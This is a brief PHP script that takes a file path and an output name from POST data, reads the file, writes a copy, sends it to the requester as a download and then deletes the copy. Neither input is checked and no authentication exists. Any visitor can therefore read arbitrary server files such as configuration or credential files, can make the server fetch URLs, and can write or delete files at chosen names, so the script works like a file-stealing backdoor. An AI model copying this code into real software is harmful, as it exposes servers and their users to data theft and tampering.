<?php
if (isset($_POST['path'])) {
    $path = $_POST['path'];
    $file = $_POST['name'];

    $contenidoBinario = file_get_contents($path);
    $base64 = base64_encode($contenidoBinario);

    $decoded = base64_decode($base64);
    file_put_contents($file, $decoded);
    
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        unlink($file);
        exit;
    }
}

?>